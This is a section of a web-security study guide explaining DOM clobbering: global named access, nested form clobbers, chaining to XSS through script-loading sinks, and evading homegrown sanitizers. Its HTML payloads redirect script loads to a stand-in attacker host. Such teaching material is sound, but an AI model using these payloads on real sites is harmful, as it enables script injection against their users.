## 5. DOM clobbering — thinking like the parser, not the developer

This is the section most directly in the spirit of *JavaScript for
Hackers*-style thinking: the bug isn't in application logic at all, it's in
a browser behavior most developers don't know exists, which is exactly why
it survives in production code that looks completely safe on read-through.

### 5.1 The core mechanic: named access on `window` and `document`

When the HTML parser encounters certain elements with an `id` or `name`
attribute, the browser automatically creates a **global reference** to that
element — on `window` for a specific allow-listed set of tag names
(`a`, `applet`, `area`, `embed`, `form`, `frameset`, `frame`, `iframe`,
`img`, `object`), and on `document` for essentially any element with an `id`
or `name` (via `document.<id>` / `document.all.<id>`-style named access).

**This happens purely from HTML parsing — before any `<script>` on the page
has executed a single line.** That's the whole exploit primitive: an
attacker who can inject HTML but **not** `<script>` tags or `on*=` event
handlers (i.e., they got past an HTML sanitizer that specifically strips
those) can still influence what a global variable *is*, simply by injecting
an element with a matching `id`.

```html
<!-- Attacker-controlled HTML, script tags stripped by a sanitizer, this survives: -->
<a id="config" href="//attacker.tld/x"></a>
```

If `example.com`'s own script later does something like:

```js
if (typeof config === 'undefined') {
  config = {}; // "safe default", or so the developer assumed
}
// ... later:
loadScript(config.apiEndpoint);
```

`config` was never actually declared by the page's own script in this
example — the `<a id="config">` element clobbered it first. `typeof config`
is `'object'` (an `HTMLAnchorElement`), not `'undefined'`, so the "safe
default" branch never runs, and `config.apiEndpoint` reads a property off the
DOM element instead of the intended object — usually `undefined`, **unless**
the attacker also nests a named child to clobber that specific property too
(see §5.2).

### 5.2 Building multi-level clobbers (nested named access)

A single `<a id=x>` only gets you `window.x` as an element with element
properties (`.href`, `.src`, `.toString()`, etc. — themselves sometimes
directly useful as attacker-controlled strings, since `.toString()` on an
anchor returns its resolved `href`). To clobber a **property path**
(`config.apiEndpoint`, not just bare `config`), nest a named form control:

```html
<form id="config">
  <input name="apiEndpoint" value="https://attacker.tld/evil.js">
</form>
```

`window.config` is now the `<form>` element, and `window.config.apiEndpoint`
resolves to the nested named `<input>` — whose `.value` (or, for some
element/attribute combinations, `.toString()`) is fully attacker-controlled
text. This is the standard "two-level clobber" primitive — extend the same
pattern for deeper property chains by nesting further, though reliability
drops as chains get longer and you should verify each level actually
resolves the way you expect in the target browser rather than assuming.

**A second useful primitive: id-collision producing a collection.** Multiple
elements sharing the same `id` don't clobber-and-overwrite each other —
`window.<id>` becomes an `HTMLCollection` of all of them, which itself has
further quirky property-access behavior (named access *into* the collection
by a second matching `name`) — worth knowing exists, less commonly needed
than the single-element or form-nesting primitives above.

### 5.3 "Exploiting DOM clobbering to enable XSS" — pattern to look for

The lab-shape version of this: application code trusts a DOM-clobberable
global as the **source of a URL later used in a script-loading sink**
(dynamically creating a `<script src=...>`, or an `import()`-like dynamic
load) — clobber the global to point that load at attacker-controlled JS,
which then executes with full page privileges once loaded. The clobber
itself doesn't execute code; it **redirects what code gets loaded/trusted
next**. Test methodology:

1. Find a variable read with an "is it defined?" guard
   (`typeof x === 'undefined'`, `if (!x)`, `x || defaultVal`) whose *fallback*
   branch would be safe, but whose *clobbered* branch (the guard evaluating
   falsy-but-not-actually-undefined, or truthy-with-wrong-shape) reaches a
   dangerous sink.
2. Confirm the page has an HTML injection point that survives whatever
   sanitizer is in front of it (this is usually a **separate, lower-severity
   bug on its own** — e.g. a markdown renderer that allows `id` attributes
   through, or a profile-bio field that permits a safe-looking tag allowlist)
   — DOM clobbering is fundamentally a **chaining** technique, rarely the
   entire vulnerability by itself.
3. Craft the clobbering HTML to satisfy the exact property path the sink
   reads, and confirm via DevTools that `window.<name>` resolves the way you
   expect before assuming the full chain will work.

### 5.4 "Clobbering DOM attributes to bypass HTML filters" — a different angle

A related but distinct use of the same primitive: instead of clobbering an
*application* variable, clobber a property the **sanitizer itself** reads to
make a security decision — e.g. a client-side HTML-cleaning routine that
checks `node.nodeName`, `node.attributes`, or a similar DOM property to
decide whether to strip an element, where that property can itself be
shadowed/clobbered by a crafted child element with a matching `name`
(`<input name="nodeName">` inside the node being checked, if the sanitizer
naively reads `el.nodeName` without confirming it's actually the built-in
getter rather than a clobbered own-property). This is a filter-evasion
technique specifically, not a "make a variable wrong" technique — the target
of the clobber is the security control's own introspection, not application
business logic.

### 5.5 What to look for as tells (fast triage before deep-diving)

- Client-side code with `typeof X === 'undefined'` / `X = X || {}` /
  `if (!window.X)` guard patterns, especially around config objects,
  feature flags, or anything loaded conditionally.
- Any client-side HTML sanitizer/cleaner that isn't a well-known hardened
  library (DOMPurify et al. handle clobbering-adjacent cases deliberately) —
  homegrown sanitizers are the highest-yield target for §5.4.
- An HTML injection point that strips `<script>` and `on*=` handlers but
  permits `id`/`name` attributes on otherwise-"safe" tags (`<a>`, `<form>`,
  `<img>`) — this is the actual prerequisite that makes clobbering reachable
  at all; without *some* HTML injection point, there's nothing to clobber
  with.

